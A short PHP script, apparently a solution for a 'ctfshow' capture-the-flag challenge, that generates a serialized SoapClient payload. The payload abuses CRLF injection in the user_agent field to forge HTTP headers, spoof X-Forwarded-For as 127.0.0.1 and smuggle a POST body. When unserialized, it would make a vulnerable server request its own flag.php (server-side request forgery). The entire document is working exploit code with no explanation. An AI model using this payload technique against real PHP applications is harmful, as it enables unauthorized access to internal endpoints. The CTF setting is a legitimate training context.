<?php
	$post_string = "token=ctfshow";
    $a = new SoapClient(null,array('location'=>'http://127.0.0.1/flag.php', 'user_agent'=>"aaaaaa\r\nContent-Type:application/x-www-form-urlencoded\r\n"."X-Forwarded-For: 127.0.0.1,127.0.0.1\r\n"."Content-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string, 'uri'=>"aaa"));
    $b = serialize($a);
    echo urlencode($b);
?>